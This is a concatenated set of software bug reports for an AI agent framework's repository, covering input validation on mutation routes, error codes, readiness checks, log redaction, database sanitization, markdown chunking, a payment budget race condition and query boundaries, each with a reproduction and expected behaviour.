- Backend logs: N/A — the exact route response and connector call ledger above
  capture the mutation boundary directly.
- Frontend console/network logs: N/A — no frontend behavior changes.
- Real-LLM trajectory: N/A — no model, prompt, provider, or planner behavior.
- Domain artifact: the connector call ledger proves that malformed input reaches
  the bulk-disconnect operation with `connectionId: null`; a live Google account
  was deliberately not mutated for reproduction.

Repository code, open pull-request file lists, and open/closed issues were
searched for `google disconnect malformed JSON`, `bulk Google disconnect invalid
body`, and `disconnectManagedGoogleConnection malformed`. No existing issue or
open PR covers this route.

26:T1361,**Describe the bug**

Several authenticated mutation routes intentionally allow an absent or empty
JSON body, but implement that contract with `request.json().catch(() => ({}))`.
That collapses three different inputs into the same value:

1. a deliberately omitted body;
2. a valid `{}` body;
3. malformed or unreadable non-empty JSON.

Because each affected schema accepts `{}`, a truncated request still performs
the mutation and returns success. The initial audit found this on agent
suspension; a follow-up sweep confirmed the same boundary defect on deployment,
campaign sharing/duplication, cancellation, and internal gateway shutdown.

Confirmed affected routes on current `develop`
(`27dec7b0c38eb6f38b397758b08be67680bf8d64`):

- `POST /api/v1/agents/:agentId/suspend`
- `POST /api/compat/agents/:id/suspend`
- `POST /api/v1/apps/:id/deploy`
- `POST /api/v1/advertising/campaigns/:id/duplicate`
- `POST /api/v1/advertising/campaigns/:id/report/share`
- `POST /api/v1/approval-requests/:id/cancel`
- `POST /api/v1/ballots/:id/cancel`
- `POST /api/v1/oauth-intents/:id/cancel`
- `POST /api/v1/payment-requests/:id/cancel`
- `POST /api/internal/discord/gateway/shutdown`

The Google connector's especially destructive default (`connectionId: null`
means disconnect all connections on a side) is tracked separately in #33073.
The already-open Docker-node drain fix is #33050 / #33051.

**Executed reproduction**

Temporary deterministic Hono-route harnesses exercised the production request
parsing, routing, schemas/defaults, response construction, and ordering relative
to each mutation. Auth, persistence lookup, and mutation services were replaced
with deterministic call ledgers.

```text
/api/v1/agents/:agentId/suspend
malformed JSON:      HTTP 202, enqueueAgentSuspendOnce calls: 1
schema-invalid JSON: HTTP 202, enqueueAgentSuspendOnce calls: 1

/api/compat/agents/:id/suspend
malformed JSON:      HTTP 202, enqueueAgentSuspendOnce calls: 1
schema-invalid JSON: HTTP 202, enqueueAgentSuspendOnce calls: 1

/api/v1/apps/:id/deploy
malformed JSON:      HTTP 202, createDeployment calls: 1

/api/v1/advertising/campaigns/:id/duplicate
malformed JSON:      HTTP 201, duplicateCampaign calls: 1

/api/v1/payment-requests/:id/cancel
malformed JSON:      HTTP 200, payment cancel calls: 1

focused reproduction total: 7 passed, 0 failed, 14 assertions
```

The four remaining listed routes have the same statically verified control
flow: parse failure becomes `{}`, the local schema accepts `{}`, then the route
invokes its mutation service. They were not counted as executed evidence.

All temporary reproduction files were removed afterward and the contribution
worktree is clean.

**Expected behavior / acceptance**

For every retained affected route:

- A genuinely absent, empty, or whitespace-only body keeps the route's existing
  documented optional-body behavior.
- A valid `{}` body keeps the same behavior.
- Malformed or unreadable non-empty JSON returns a structured HTTP 400 before
  the mutation service is invoked.
- Syntactically valid but schema-invalid JSON returns HTTP 400; in particular,
  the two suspend routes must stop replacing invalid `reason` values with the
  default reason.
- Regression tests assert both the response and an empty mutation call ledger
  for malformed input, plus the intended bodyless behavior for each route.
- Any shared parser/helper must preserve route-specific envelopes and must not
  turn this into an unproved API-wide mechanical sweep.

This can be delivered in acceptance-ready slices if maintainers prefer, but the
issue records the confirmed family so fixes are consolidated rather than
rediscovered route by route.

**Evidence / reproduction proof**

- Screenshots / recording: N/A — server-only API behavior with no rendered UI.
- Backend logs: N/A — exact route responses and mutation call ledgers are
  recorded above.
- Frontend console/network logs: N/A — no frontend behavior changes.
- Real-LLM trajectory: N/A — no agent planner or model behavior is under test.
- Domain artifacts: no live resources were mutated; the route-level service
  call ledgers prove that invalid requests cross each mutation boundary.

**Duplicate and overlap search**

Repository code, open pull-request file lists, and open/closed issues were
searched for malformed/invalid JSON with each mutation name. No existing issue
or open PR covers these routes. #33051 is deliberately limited to the
Docker-node drain route and already has exact-head approvals, so it should not
be expanded after review.

27:T11c2,**Describe the bug**

`cryptoPaymentRefundsService.refundAsCloudCredits` reports two refund-key problems with the code reserved for an unusable amount.

- `packages/cloud/shared/src/lib/services/crypto-payment-refunds.ts:123-125`: a refund key that fails the `^[A-Za-z0-9][A-Za-z0-9._:-]{7,127}$` pattern throws `CryptoRefundError("CRYPTO_REFUND_INVALID_AMOUNT", "Refund key is invalid")`.
- `:193-197`: a refund key that was already used for a different amount throws `CryptoRefundError("CRYPTO_REFUND_INVALID_AMOUNT", "Refund key was already used for a different amount")`.
- `:126-131` is the actual amount check, which throws the same code with "Refund amount must be a positive USD amount with at most six decimals".

The code union (`:37-44`) has no member for a key problem. The messages are right; the typed reason is wrong, which is the same shape as #32945 (a whole-cents amount reported as `AMOUNT_TOO_LARGE`). The repository error policy asks for an actionable `code`; an operator who branches on `CRYPTO_REFUND_INVALID_AMOUNT` and corrects the amount is chasing the wrong field for both key cases.

Consumers: `git grep CRYPTO_REFUND_INVALID_AMOUNT` across `packages/` and `plugins/` finds only the service and its test. The operator script (`packages/cloud/scripts/admin/refund-crypto-payment.ts`) prints the thrown error, so it shows the code verbatim.

**To Reproduce**

On `origin/develop` `27dec7b0c3`, Bun 1.3.14, against a PGlite database migrated with `bun run db:cloud:migrate` and holding no rows. A probe calls the real service with three keys (the third is well-formed, so it reaches the payment lookup):

```
$ DATABASE_URL=pglite://<dir> bun --conditions=eliza-source <probe>.ts
{"refundKey":"k","code":"CRYPTO_REFUND_INVALID_AMOUNT","message":"Refund key is invalid"}
{"refundKey":"bad key with spaces","code":"CRYPTO_REFUND_INVALID_AMOUNT","message":"Refund key is invalid"}
{"refundKey":"support-ticket-0001","code":"CRYPTO_REFUND_PAYMENT_NOT_FOUND","message":"Crypto payment not found"}
```

The reuse case needs a settled payment; the service test's PGlite fixture reproduces it (refund once with key `support-ticket-3` for 2 USD, then again with the same key for 3 USD) and gets `CRYPTO_REFUND_INVALID_AMOUNT` from `:193-197`.

**Expected behavior**

- A malformed refund key gets its own code, for example `CRYPTO_REFUND_INVALID_KEY`, with the current message.
- A refund key reused with a different amount gets its own code, for example `CRYPTO_REFUND_KEY_AMOUNT_MISMATCH`, with the current message and the `paymentId` context.
- `CRYPTO_REFUND_INVALID_AMOUNT` stays for the amount check only. No message, ordering or ledger behaviour changes.

N/A - a service error code with no rendered surface; the probe transcript above is the proof.

28:T191e,**Describe the bug**

`/api/status`, `/api/health` and the WebSocket status payload report `canRespond: true` on two runtimes whose first turn cannot be served, because `computeCanRespond` counts the local-inference router as a text provider.

- `computeCanRespond` (`packages/agent/src/api/health-routes.ts:468`) asks `hasTextGenerationHandler(runtime)`, which is satisfied by any registration on a text slot. The local-inference plugin registers `eliza-router` on every text slot (`plugins/plugin-local-inference/src/services/router-handler.ts`, `installRouterHandler`). The router serves nothing itself: it dispatches to the other registered handlers, and with none it throws `NoModelProviderConfiguredError` (`router-handler.ts:488-490`, "No provider registered for TEXT_LARGE. Configure a cloud provider, enable local inference, or pair a device."). A runtime whose text slots hold only the router therefore reports `canRespond: true` while every turn fails. That shape is produced in practice: with `ELIZA_DEVICE_BRIDGE_ENABLED=1` and no device attached, `ensureLocalInferenceHandler` installs the router and returns before registering any text handler (`plugins/plugin-local-inference/src/runtime/ensure-local-inference-handler.ts:1784-1797`).
- `isCloudTextModelUnavailable` (`health-routes.ts:640-644`) gates chat only when every provider registered for a missing Cloud model type is `elizaOSCloud`. On a host where the router sits beside Cloud alone, `providers` is `["eliza-router", "elizaOSCloud"]`, so a positive catalog answer that the Cloud model is missing never gates chat, although the router's only candidate is that same Cloud handler.

`readLocalTextModelReadiness` already leaves the router out of its registration filter (`health-routes.ts:500-506`, since #32953). The two checks above do not. The #32953 review recorded both as non-blocking findings; this issue is the follow-up.

**To Reproduce**

On `origin/develop` `27dec7b0c3`, Bun 1.3.14, Node 24.15.0, a test that installs the production router on a real `AgentRuntime` and compares `canRespond` with what `useModel` does:

```ts
const runtime = new AgentRuntime({ character: { name: "Router only", bio: [] } });
installRouterHandler(runtime); // production router from plugin-local-inference
await expect(
  runtime.useModel(ModelType.TEXT_LARGE, { prompt: "first turn" }),
).rejects.toBeInstanceOf(NoModelProviderConfiguredError); // passes
expect(computeCanRespond(runtime, "running", null)).toBe(false); // fails: true
```

```ts
const runtime = await initializedRuntime("Router over Cloud");
runtime.registerModel(ModelType.TEXT_LARGE, noInference, "elizaOSCloud");
installRouterHandler(runtime);
// CLOUD_MODEL_REGISTRY service reports TEXT_LARGE as model_not_available
expect(computeCanRespond(runtime, "running", null)).toBe(false); // fails: true
```

```
$ cd packages/agent && bunx vitest run test/response-readiness-router.test.ts   # develop health-routes.ts
 ❯ test/response-readiness-router.test.ts (6 tests | 2 failed)
   × does not report a router with no provider behind it as able to respond
   × gates a Cloud-only runtime behind the router when the catalog lacks the model
AssertionError: expected true to be false // Object.is equality
AssertionError: expected true to be false // Object.is equality
```

Without the router, the same Cloud-only runtime is gated correctly, which the existing `local-model-readiness-http.test.ts` pins ("preserves Cloud unknown, explicit unavailable, and fallback-provider behavior").

**Expected behavior**

- A runtime whose text slots hold nothing but the router reports `canRespond: false`, the same as a runtime with no text handler at all.
- A runtime with Cloud behind the router is gated by a positive catalog answer that the Cloud model is missing, the same as a Cloud-only runtime without the router.
- A router over any real provider (local inference, Cloud, OpenAI, Ollama, a custom provider) keeps reporting `canRespond: true`.

**Screenshots / recording of the wrong behavior (required for anything visible)**

N/A - the defect is in the readiness JSON that the composer gate reads; the test transcript above is the proof. The visible effect is a composer that goes live on a host whose first turn then fails.

**Evidence / reproduction proof**

- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no rendered surface of its own; see the transcript.
- [x] Backend logs and frontend console/network logs when relevant: the assertion output above; `useModel` rejects with `NoModelProviderConfiguredError` on the router-only runtime.
- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model is invoked; the router rejects before any provider.
- [x] Domain artifacts when relevant: the registration table of the router-only runtime (`getModelRegistrations()` filtered to `TEXT_LARGE` gives `["eliza-router"]`).

**Additional context**

- `hasTextGenerationHandler` lives in `plugins/plugin-assistant/src/services/message/trajectory-stages.ts:385-397` and uses `runtime.getModel(type)`, which returns the router's handler. The narrowest fix keeps that helper and adds a router-aware registration check in `health-routes.ts`, which already knows the router's provider name.
- On a device-bridge host, the UI composer currently goes live while the device is still absent. After the fix it stays locked until a device or another provider registers, which matches what a turn would do.

29:T187c,**Describe the bug**

Three Cloud operator scripts cannot start. Their documented commands stop at module loading, before the script reaches the service it exists to call.

- `packages/cloud/scripts/admin/refund-crypto-payment.ts:43-45` imports `@/lib/services/crypto-payment-refunds`.
- `packages/cloud/scripts/admin/promote-admin.ts:47` imports `@/lib/services/admin`.
- `packages/cloud/scripts/admin/set-billing-email.ts:15-16` imports `@/db/client` and `@/db/schemas/organizations`.

The `@/` alias is a `paths` entry in `packages/cloud/shared/tsconfig.json`. Nothing maps it for `packages/cloud/scripts`: the tooling package (`packages/cloud/scripts/package.json`) has no tsconfig, and neither Bun nor `tsx` resolves the alias from there. Every other script in that directory that needs Cloud code imports it through the `@elizaos/cloud-shared` package exports (`packages/cloud/shared/package.json:10-15`, `./db/*` and `./lib/*`), which the tooling package already declares as a workspace dependency. These three are the only `@/` imports left under `packages/cloud/scripts` (`git grep -n 'from "@/\|import("@/' packages/cloud/scripts`).

The refund script is the only runtime caller of `cryptoPaymentRefundsService.refundAsCloudCredits`, so an operator has no working path to the refund flow that #32955 just hardened. This was first noted as a non-blocking finding in the #32955 review.

**To Reproduce**

On `origin/develop` `27dec7b0c3`, Bun 1.3.14, Node 24.15.0, after `bun install --frozen-lockfile --ignore-scripts`, with `DATABASE_URL` pointing at a PGlite directory migrated by `bun run db:cloud:migrate`. Paths are shortened to the repository root.

```
error: Cannot find module '@/db/client' from 'packages/cloud/scripts/admin/set-billing-email.ts'
```

The same three commands with `--conditions=eliza-source`, which the root `db:cloud:migrate` command uses for this directory, fail on the same line. `node_modules/.bin/tsx`, the runner named in `set-billing-email.ts`'s own usage line, fails with `ERR_MODULE_NOT_FOUND` for the same specifier.

Resolution check from the scripts' own directory:

```

FAIL @/lib/services/crypto-payment-refunds   Cannot find module

```

**Expected behavior**

Each documented command loads its Cloud modules and reaches the service. With the imports pointed at the `@elizaos/cloud-shared` exports, the same three commands against the same empty migrated database end in the service's own answer: `CRYPTO_REFUND_PAYMENT_NOT_FOUND`, `No admins found.`, and `Organization not found`.

A test in the tooling package should pin that no script under `packages/cloud/scripts` imports through `@/`, and that the refund and admin-promotion scripts get past module loading.

**Screenshots / recording of the wrong behavior (required for anything visible)**

N/A - command-line operator scripts with no rendered surface. The transcripts above are the proof.

**Evidence / reproduction proof**

- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface; see the transcripts.

**Additional context**

- `packages/cloud/scripts/README.md` says operations are invoked through their documented commands. The usage lines of these three scripts are the only documentation of those commands.

2a:T9ce,**Describe the bug**

The authenticated admin route `POST /api/v1/admin/docker-nodes/:nodeId/drain`
treats malformed JSON as if the caller deliberately sent no body. It then
invokes the destructive drain operation with `deprovision: false` and returns
HTTP 200 instead of rejecting the invalid request.

This is an input-boundary bug on an administrative mutation: a truncated or
otherwise malformed request can disable a Docker node even though the request
cannot be interpreted reliably.

**To Reproduce**

1. Authenticate as an admin.
2. Send `POST /api/v1/admin/docker-nodes/node-1/drain` with
   `Content-Type: application/json` and the truncated body
   `{"deprovision":`.
3. Observe HTTP 200 and a call to `drainNode("node-1", { deprovision: false })`.

A deterministic Hono route harness against current `develop` reproduced the
failure:

```text
expected status: 400
received status: 200
drainNode calls: [["node-1", {"deprovision": false}]]
```

**Expected behavior**

Malformed or unreadable JSON must return HTTP 400 before the autoscaler is
called. A genuinely bodyless request must remain valid and retain the current
`deprovision: false` behavior.

**Screenshots / recording of the wrong behavior (required for anything visible)**

N/A - this is a server-only administrative API path with no rendered UI.

**Evidence / reproduction proof**

- [x] MP4 recording or JPG screenshots: N/A - no rendered visual surface.
- [x] Backend logs: N/A - the route does not emit an application log for this
      request; the real route response and mocked autoscaler call ledger are
      included above.
- [x] Frontend console/network logs: N/A - no frontend behavior changes.
- [x] Real-LLM trajectory: N/A - no agent, prompt, provider, or model behavior.
- [x] Domain artifacts: the route response and autoscaler invocation ledger
      above capture the mutation boundary directly.

**Additional context**

Neighboring Docker-node create and update routes already reject malformed JSON
with HTTP 400. A repository and GitHub search found no open issue or pull
request covering this drain-route failure.

Client / agent tooling: Codex

2b:T5b4,## Defect

`redactLogValue` in `packages/core/src/security/log-redaction.ts` keeps every visited object in a single never-pruned `WeakSet` (`seen.add` with no `delete`). Every log sink that goes through it (core logger metadata and trailing args, `packages/ui/src/logger.ts`, cloud `redactLogArgs`) prints the second reference to any shared, non-cyclic object as `[Circular]`.

Reproduced on develop `b4eb27576f` through the real core logger:

```ts
const owner = { id: "u1", name: "Ada", apiKey: "sk-live-fixture" };
logger.info({ requester: owner, assignee: owner }, "probe-shared-reference");
// recentLogs(): ... requester={"id":"u1","name":"Ada","apiKey":"[REDACTED]"}, assignee=[Circular]
```

Also: `{ error, lastError: error }` drops the second error; `[tag, tag, tag]` logs one tag and two `[Circular]` markers.

## Authority

This is the logger site of #25125, consolidated into #31004 on 2026-09-14 ("explicitly includes logger redaction … remains a real unresolved bug"). #31004 closed on 2026-09-27 after three other sites were fixed; the logger walker moved to `packages/core/src/security/log-redaction.ts` in the restructure and was not among them.

## Acceptance

- Shared references render in full (and redacted) at every position; true cycles still collapse to `[Circular]`.
- The walk stays bounded on densely shared graphs (e.g. an HTTP client error carrying its request/socket/agent).
- Regression tests on the real walker.

Fix: #33045
2c:Tdc8,## Problem

The native cloud gateway (`packages/auth/native-host/cloud-services/cloud-services.mjs`) reads the saved pending sign-in journal in three places with three different levels of parse discipline, and two of them violate the contract the other readers establish.

1. **`accountAccess` (the `GET /cloud/account/access` reader) parses the journal unguarded:**

```js
const pending = await pendingCredentialStore?.read();
if (pending && JSON.parse(pending).kind === "revocation")
```

A journal that is unparseable **after startup** (partial write, editor, sync tool — `ready` already resolved with valid bytes, so the per-request read is what sees the corruption) throws a raw `SyntaxError` through the route boundary, which maps it to **502 `{"error":"Cloud service unavailable"}`**. Every sibling reader of the same bytes returns the designed **409 `savedSignInNeedsAccountRecovery`** account-recovery state instead (`ready`, `usableCredential`, and three sites in `cloud-enrollment.mjs`). The account panel therefore renders a transient-looking provider outage that invites endless retry instead of the recovery path.

2. **`ready` and `usableCredential` parse guarded but then dereference `.kind` on whatever parsed:**

```js
try { saved = JSON.parse(raw); } catch { throw fail(message("savedSignInNeedsAccountRecovery"), 409); }
if (saved.kind === "revocation") ...
```

A journal that parses to `null` or a primitive (the string `"null"` is exactly what `/cloud/status`'s own reader is written to tolerate: `JSON.parse(pending ?? "null")?.kind`) makes `ready` reject with a `TypeError` **outside its try**, so `await ready` fails on **every** `/cloud/*` route with 502 `Cloud service unavailable` — including `/cloud/status`, whose own parse would have treated the same bytes as benign.

## Reproduction (current `develop`)

`develop` `9ffc6f626c02dbf5bdba09911f91c2bbf488fad4`; `cloud-services.mjs` blob `855478cebe3b56feda4ddc6b10bd6962e043b8fa`.

Driving `createCloudRoutes` over a real loopback HTTP server with an in-memory `pendingCredentialStore`:

- Store returns `null` at startup, then `"{not json"` before `GET /cloud/account/access` → **502** `{"error":"Cloud service unavailable"}` (expected 409 `savedSignInNeedsAccountRecovery`; `GET /cloud/account/invoices` through `usableCredential` already 409s on the same bytes).
- Store returns the string `"null"` from startup → `GET /cloud/status` → **502** on every route via the `ready` rejection (expected: benign `disconnectPending: false`, matching the route's own `JSON.parse(pending ?? "null")?.kind` reader).

## Acceptance criteria

- A pending journal that is unparseable at request time makes `/cloud/account/access` return the 409 `savedSignInNeedsAccountRecovery` state, never a 502 outage.
- A journal that parses to `null`/a primitive is benign everywhere: no route fails in `ready`, `usableCredential`, or `accountAccess`; `/cloud/status` keeps reporting `disconnectPending: false`.
- The malformed-parse catch is documented as error-policy:J3 (explicit invalid state, never a fake-valid default).
- Regression tests drive the real route handler over HTTP with a mutable pending store; `node --test native-host/cloud-services/*.test.mjs` and `node --test native-host/*.test.mjs` pass.

## Duplication check

Open issue/PR searches for `savedSignInNeedsAccountRecovery`, `pendingCredentialStore`, and `cloud-services` found no matching work. #33272/#33273 hardened `projectCheckout` in this file; nothing touches the journal readers.2d:T638,### Problem

2f:T9d6,**Describe the bug**

#34093 / #34094 route memory-content replacement, atomic-publication heads, and `updateLogs` through the jsonb sanitizer. The rest of the entity-graph writes in `plugins/plugin-sql/src/base.ts` still bind caller objects through drizzle's default `JSON.stringify` (or a hand-built `JSON.stringify(...)::jsonb`), with no check for text PostgreSQL jsonb cannot store. A NUL character or a lone UTF-16 surrogate (typically a truncated emoji) in entity, component, room, world, task, relationship, cache or agent data fails in the driver:

- Some writes surface the raw `22P02` / `22P05` `DrizzleQueryError`.
- Others wrap it in a generic `DB_*_FAILED`.

The memory path returns the typed `SQL_JSON_UNSUPPORTED_NUL` / `SQL_JSON_UNSUPPORTED_SURROGATE` instead. In both cases the drizzle `Failed query` message embeds the bound parameters, so the caller's data goes into any log that records the error.

**To Reproduce**

On `origin/develop` `65621da3a4` (with #34094 applied), real PGlite via `createIsolatedTestDatabase`. Each write gets `{ note: "x \ud83d" }` in its jsonb field:

| Write | Result |
|---|---|
| `updateEntity` metadata | raw `22P02`, `Failed query: update "entities" …` |
| `createComponent` data | raw `22P02`, `Failed query: insert into "components" …` |
| `updateRoom` metadata | raw `22P02`, `Failed query: update "rooms" …` |
| `updateWorld` metadata | raw `22P02`, `Failed query: update "worlds" …` |
| `createTask` metadata | raw `22P02`, `Failed query: insert into "tasks" …` |
| `createEntities` metadata | `DB_INSERT_FAILED` wrapping the raw error |
| `createRelationship` metadata | `DB_INSERT_FAILED` wrapping the raw error |
| `setCache` value | `DB_UPSERT_FAILED` wrapping the raw error |
| `updateAgent` settings | `DB_UPDATE_FAILED` wrapping the raw error |

Other sites with the same binding:
- `createAgent`, `updateComponent`, `createRooms`, `updateRelationship`, `createWorld`, `updateTask`;
- `compareAndSwapWorldMetadata`, `patchComponents`, `updatePendingTask`, `patchTaskMetadata`;
- the cache compare-and-swap.

**Expected behavior**

These writes reject unsupported text before the bind with the same typed `SQL_JSON_UNSUPPORTED_NUL` / `SQL_JSON_UNSUPPORTED_SURROGATE` errors, carrying no content.

Routing them through `serializeJsonb` would also apply its 1 MiB / 10,000-node / depth-64 structural caps and cycle rewriting. That would add new hard limits to component, task and agent data that have none today, so the check should be text-only.
30:T24f9,**Describe the bug**

Three jsonb writes in `plugins/plugin-sql/src/base.ts` bind caller text without the shared sanitizer in `plugins/plugin-sql/src/sanitize-json.ts`. A NUL character or a lone UTF-16 surrogate (half of a pair, typically a truncated emoji) reaches PostgreSQL and fails with the driver's raw `22P05` / `22P02` error. The matching create paths return a typed error instead: `SQL_JSON_UNSUPPORTED_NUL` / `SQL_JSON_UNSUPPORTED_SURROGATE` for memory rows, and for log bodies the NUL is stripped and the surrogate replaced with U+FFFD. #33124 added the lone-surrogate half of that policy to the sanitizer, but these three writes never call it.

- `base.ts:2223`, `publishMessageContentSegments` in replace mode: `.set({ content: params.replacementContent })` passes the content object to drizzle, which binds `JSON.stringify(value)`. Create mode of the same method writes the parent through `insertMemoryInTransaction` (`base.ts:2122`), which applies the strict serializer to content and metadata (`base.ts:4672-4680`). The public `runtime.replaceMessageMemoryContent` (`packages/core/src/runtime.ts:5264`, `packages/core/src/runtime/data-mutations.ts:413-470`) reaches this branch. plugin-assistant calls it through `replaceStoredMessageContent` after attachment enrichment, after an incoming hook rewrites the text, and after translation (`plugins/plugin-assistant/src/services/message/processor.ts:526`, `:581`, `:1110`). Text under the 64 KiB inline limit stays in the parent row, so it reaches this write. Longer text goes to segment rows, which are already sanitized.
- `base.ts:7978-7979`, `compareAndSwapMemoryPublication`: the head's content and metadata are bound as `JSON.stringify(...)` with a `::jsonb` cast. The dependencies of the same publication go through `insertMemoryInTransaction`.
- `base.ts:7890`, `updateLogs`: `setValues.body = updates.body` binds the new body unsanitized. `log()` passes the body through `sanitizeJsonObject` first (`base.ts:4052`).

The raw error is also a worse failure to surface: drizzle's `Failed query` message embeds the bound parameters, so the whole content goes into any log that records the error. The typed errors carry no content.

**To Reproduce**

On `origin/develop` `65621da3a4`, with Bun 1.3.14, Node 24.15.0 and `bun install --frozen-lockfile --ignore-scripts`. The probe uses a real PGlite adapter and the real `AgentRuntime` from `createIsolatedTestDatabase` (`plugins/plugin-sql/src/__tests__/test-helpers.ts`), and creates a room and an entity first:

```ts
await adapter.createMemory({ id, agentId, entityId, roomId, content: { text: "original" }, metadata: { type: "message" } }, "messages");
await runtime.replaceMessageMemoryContent(id, { text: "x \ud83d" });
await runtime.replaceMessageMemoryContent(id, { text: "x \u0000" });
await adapter.compareAndSwapMemoryPublication({ head: { memory: { id: headId, agentId, entityId, roomId, content: { text: "x \ud83d" }, metadata: { revision: "r1" } }, tableName: "probe_heads" }, dependencies: [], expectedRevision: null });
await adapter.compareAndSwapMemoryPublication({ /* same head */ content: { text: "ok" }, metadata: { revision: "r1", note: "a\u0000b" } });
await adapter.log({ body: { reply: "first" }, entityId, roomId, type: "probe" });
await adapter.updateLogs([{ id: logId, updates: { body: { reply: "done \ud83d", nested: { text: "a\u0000b" } } } }]);
```

Probe output, verbatim (the error message is cut at 160 characters by the probe):


**Expected behavior**

Each write applies the policy its create path already applies:

- The replacement parent and the publication head reject with `ElizaError` `SQL_JSON_UNSUPPORTED_SURROGATE` or `SQL_JSON_UNSUPPORTED_NUL`, as `createMemory` does. Nothing is written: the parent is unchanged, and no segment or dependency row is staged.
- `updateLogs` stores the body with NUL removed and lone surrogates replaced by U+FFFD, as `log()` does.
- Well-formed surrogate pairs such as emoji are stored unchanged.

31:T772,`chunkMarkdownText` (`packages/core/src/markdown/chunk.ts`) can emit an empty code block, then reopen the fence in the next chunk, when a fenced block's closing line is longer than `indent + marker`. That covers trailing spaces or tabs (`"``` "`), a longer closing marker (```` ```` ```` closing ```` ``` ````), an indented closer (`"  ```"`), and `"~~~ "`. Every outbound text that goes through the markdown chunker is affected.

## Reproduction (current `develop` `65621da3a42`, Bun 1.4.2)

```ts
import { chunkMarkdownText } from "@elizaos/core";
const body = Array.from({ length: 10 }, (_, i) => `line ${i} value${"x".repeat(i % 4)}`);
const text = `Intro.\n\n\`\`\`ts\n${body.join("\n")}\n\`\`\` \n\nOutro paragraph.`;
chunkMarkdownText(text, 16);
// [..., "```ts\nline 9\n```", "```ts\n``` \n", "Outro paragraph."]
```

Across limits 16..110 with the same 10-line block, empty code-block chunks per closing line:

| Closing line | `"```"` | `"``` "` | `"```  "` | `"```\t"` | ```` "````" ```` | `"~~~ "` | `"  ```"` | `"  ``` "` | ```` "``````   " ```` |
|---|---|---|---|---|---|---|---|---|---|
| Empty blocks | 0 | 4 | 8 | 4 | 4 | 4 | 8 | 11 | 23 |

## Cause

When a split lands inside a fence, the chunker reserves room only for the synthetic closer `${indent}${marker}`. If the original closing line is longer, there are limits where the chunk fits the synthetic closer but not the real one. The cut then lands at the start of the real closing line, and the next chunk reopens the fence (`openLine + "\n"`) just to close it again.

Once #34057 (CRLF fence recognition) merges, CRLF input hits the same path, because the `\r` makes every CRLF closing line one character longer.

## Expected

When the cut leaves no fence content, close the fence in the current chunk and drop the original closing line. No chunk should be an empty code block, and code content and the chunk limit stay unchanged.
32:Tcb0,**Describe the bug**

In `plugins/plugin-wallet/src/sdk/x402/client.ts`, a payment is checked with `this.budget.checkBudget(service, amount)` (sync), then `await this.executePayment(selected)` (an on-chain transfer), and only afterwards recorded with `this.budget.recordPayment(log)`. `X402BudgetTracker` keeps `dailySpend` in memory and only updates it in `recordPayment`. So concurrent x402 requests to the same service can all pass the per-service `dailyLimit` check before any of them is recorded, and the agent spends past the configured service cap.

Scope, to be precise: the AgentWallet contract's on-chain spend policy (`setSpendPolicy` / `remainingBudget`) still bounds global spend when it's configured. What can be exceeded is the client-side per-service caps (`serviceBudgets[].dailyLimit`) and `globalDailyLimit` when no on-chain policy is set.

**To Reproduce**

A minimal script against the real `budget.ts` (at `f7a6b0fea5`) that mirrors the client's check → await → record order:

```ts
import { X402BudgetTracker } from "./budget.ts";
const tracker = new X402BudgetTracker({
  serviceBudgets: [{ service: "api.example.com", maxPerRequest: 1_000_000n, dailyLimit: 5_000_000n }], // $5/day
});
const executePayment = () => new Promise<void>((r) => setTimeout(r, 50)); // stands in for the transfer
async function pay(i: number) {
  if (!tracker.checkBudget("api.example.com", 1_000_000n).allowed) return "blocked";
  await executePayment();
  tracker.recordPayment({ timestamp: Date.now(), service: "api.example.com", url: `https://api.example.com/${i}`,
    amount: 1_000_000n, token: "0x00…00", recipient: "0x00…01", success: true } as any);
  return "paid";
}
const outcomes = await Promise.all(Array.from({ length: 10 }, (_, i) => pay(i)));
```

Output (`bun run repro.ts`):

```
10 concurrent $1 payments against a $5/day service cap -> paid=10, blocked=0, recorded spend=$10
next check after they settle: allowed=false (Would exceed daily limit 5000000 for api.example.com)
```

**Expected behavior**

At most 5 of the 10 payments proceed, and the rest are blocked before `executePayment` runs.

**Screenshots / recording of the wrong behavior (required for anything visible)**

N/A - not a visible bug; the reproduction output above is the evidence.

**Evidence / reproduction proof**

- [ ] MP4 recording or JPG screenshots: N/A - logic race, no UI.
- [x] Logs: script output above.
- [ ] Real-LLM trajectory: N/A - independent of the model.
- [x] Domain artifacts: recorded spend $10 against a $5 service cap.

**Additional context**

A small fix that keeps the existing API: have `checkBudget` *reserve* the amount synchronously when it allows a payment (add it to a pending total that the daily checks include), then turn the reservation into spend in `recordPayment`, or release it if `executePayment` throws or fails. Because there's no `await` between the check and the hold, concurrent requests can't both pass against the same remaining budget. Totals would still be in memory, so restarts reset them; that seems acceptable as long as the on-chain policy is the hard limit.

I'm happy to send that as a PR with a test based on the reproduction above. (I maintain Inferrail, where I fixed the same pattern.)
33:T60e,## Problem

`RuntimeModelDispatch.useModel` now composes distinct caller and turn signals for the provider transport, downstream delivery, and embedding validation, but `throwIfAborted` still checks the two source signals separately in fixed caller-first order. If the turn aborts first and provider cleanup synchronously aborts the caller controller before the handler rejection reaches the runtime, the provider signal correctly retains the turn reason while `useModel` throws the later caller reason.

Reproduced on `develop` at `88c6db14b0e4aeaeed79811b068a7906ee0756b7`. A real `AgentRuntime` handler waits on the composed provider signal; its abort listener aborts the caller controller with a different reason and rejects. The focused cancellation suite is **1 failed / 7 passed**: the pending model call rejects with `caller cleanup cancelled second` instead of `turn cancelled first`.

## Expected behavior

Runtime cancellation checks should use the same composed dispatch signal already delivered to the provider. The first abort reason must remain authoritative, cancellation must not trigger provider fallback, and neither caller params nor controller ownership should be mutated.

## Proposed scope

Make `throwIfAborted` consult `dispatchSignal`, add the competing-owner regression, and update the model cancellation API comment to describe composition and identity preservation. No provider API or dependency changes.

AI provider/model: OpenAI / GPT-5
Client / agent tooling: Codex
Attribution status: self-reported
— [contributor]34:T49d,## Problem

The Gmail MESSAGE adapter converts `sinceMs` to Gmail's exclusive `after:` search operator with `Math.floor(sinceMs / 1000)`. When `sinceMs` is exactly on a whole-second boundary, the generated query excludes a message at the requested timestamp before the adapter's exact local filter can see it.

Example: `sinceMs: 7000` generates `after:7`. A Gmail message whose `internalDate` is exactly `7000` should satisfy the adapter's inclusive `receivedAt >= sinceMs` contract, but Gmail omits it because `after:` is exclusive.

## Reproduction

Against current `develop`, add a provider-faithful mailbox row at 7000 ms and call `searchMessages({ sinceMs: 7000, limit: 5 })`.

```text
Expected: ["sent_1", "sent_2", "sent_3"]
Received: ["sent_2", "sent_3"]
```

